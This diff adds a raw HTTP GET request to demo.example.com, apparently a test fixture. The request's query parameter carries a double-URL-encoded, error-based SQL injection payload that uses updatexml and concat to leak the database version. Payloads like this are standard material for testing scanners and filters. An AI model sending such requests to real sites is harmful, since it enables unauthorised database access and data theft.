@@ -1,0 +1,4 @@
+GET /a?data=x%2527%2Bor%2Bupdatexml%25281%252Cconcat%25280x7e%252C%2528select%2Bversion%2528%2529%2529%2529%252C1%2529%2523 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
